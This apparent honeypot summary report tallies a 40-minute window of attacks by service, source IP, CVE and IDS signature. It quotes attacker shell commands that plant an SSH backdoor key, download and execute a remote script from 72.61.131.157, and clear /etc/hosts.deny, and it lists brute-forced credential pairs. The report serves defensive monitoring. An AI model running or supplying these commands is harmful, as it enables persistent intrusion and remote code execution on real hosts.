Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-18T13:01:25Z
**Timeframe:** 2025-10-18T12:20:01Z to 2025-10-18T13:00:01Z
**Log Files:** agg_log_20251018T122001Z.json, agg_log_20251018T124001Z.json, agg_log_20251018T130001Z.json

**Executive Summary**

This report summarizes honeypot activity over a 40-minute period, analyzing 23,660 recorded events. The majority of attacks targeted Mail (SMTP), SSH, and SMB services. A significant portion of the attacks originated from a single IP address, 172.245.214.35, which was responsible for over 30% of the total attack volume. The most common vulnerability targeted was CVE-2022-27255, a buffer overflow vulnerability in Realtek's eCos SDK. Attackers were observed attempting to modify SSH authorized_keys to gain persistent access.

**Detailed Analysis**

***Attacks by Honeypot***

*   Mailoney: 7,384
*   Cowrie: 6,483
*   Dionaea: 3,821
*   Honeytrap: 2,450
*   Suricata: 1,951
*   Ciscoasa: 1,144
*   Sentrypeer: 152
*   Heralding: 84
*   Tanner: 81
*   Miniprint: 27
*   Adbhoney: 25
*   H0neytr4p: 24
*   Redishoneypot: 18
*   ConPot: 8
*   Honeyaml: 6
*   ElasticPot: 2

***Top Attacking IPs***

*   172.245.214.35: 7,169
*   1.1.224.153: 3,129
*   45.140.17.52: 1,143
*   51.89.1.87: 1,111
*   194.50.16.73: 1,012
*   134.199.194.180: 999
*   72.146.232.13: 914
*   42.114.248.202: 649

***Top Targeted Ports/Protocols***

*   25 (SMTP): 7,384
*   445 (SMB): 3,777
*   22 (SSH): 1,429
*   5903 (VNC): 225
*   5060 (SIP): 152
*   2087 (WHM/cPanel): 117
*   8333 (Bitcoin): 109
*   5901 (VNC): 111

***Most Common CVEs***

*   CVE-2022-27255
*   CVE-2002-0013, CVE-2002-0012
*   CVE-2021-3449
*   CVE-2019-11500
*   CVE-2018-10562, CVE-2018-10561
*   CVE-2001-0414
*   CVE-2024-3721
*   CVE-2005-4050
*   CVE-2002-1149
*   CVE-2024-12856, CVE-2024-12885

***Commands Attempted by Attackers***

*   `cd ~; chattr -ia .ssh; lockr -ia .ssh`
*   `lockr -ia .ssh`
*   `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
*   `cat /proc/cpuinfo | grep name | wc -l`
*   `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
*   `uname -m`
*   `whoami`
*   `cd /data/local/tmp/; busybox wget http://72.61.131.157/w.sh; sh w.sh; ...`
*   `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;`

***Signatures Triggered***

*   ET SCAN MS Terminal Server Traffic on Non-standard Port
*   ET HUNTING RDP Authentication Bypass Attempt
*   ET DROP Dshield Block Listed Source group 1
*   ET SCAN NMAP -sS window 1024
*   ET EXPLOIT Realtek eCos RSDK/MSDK Stack-based Buffer Overflow Attempt Inbound (CVE-2022-27255)
*   ET INFO Reserved Internal IP Traffic
*   ET SCAN Potential SSH Scan
*   ET DROP Spamhaus DROP Listed Traffic Inbound
*   ET INFO CURL User Agent

***Users / Login Attempts***

*   345gs5662d34/345gs5662d34
*   user/user1234567890
*   ftpuser/ftppassword
*   admin/admin111
*   nobody/p@ssw0rd
*   root/25122014
*   root/1234567890!
*   root/Admin123...

***Files Uploaded/Downloaded***

*   wget.sh;
*   gpon80&ipv=0
*   w.sh;
*   c.sh;
*   apply.cgi
*   11
*   fonts.gstatic.com

***HTTP User-Agents***

*   No user agents recorded in this timeframe.

***SSH Clients and Servers***

*   No SSH clients or servers recorded in this timeframe.

***Top Attacker AS Organizations***

*   No AS organizations recorded in this timeframe.

**Key Observations and Anomalies**

*   **High Volume from Single IP:** The IP address 172.245.214.35 was responsible for a disproportionately high volume of attacks, primarily targeting the Mailoney (SMTP) honeypot.
*   **Persistent Access Attempts:** The repeated attempts to modify SSH authorized_keys indicate a clear objective to establish persistent access to the compromised system.
*   **Targeting of IoT/Embedded Devices:** The presence of CVE-2022-27255, a vulnerability in a Realtek SDK, suggests that attackers are targeting IoT and embedded devices.
*   **Use of Wget and Curl for Malware Delivery:** The commands involving `wget` and `curl` to download and execute shell scripts from a remote server is a common malware delivery technique.
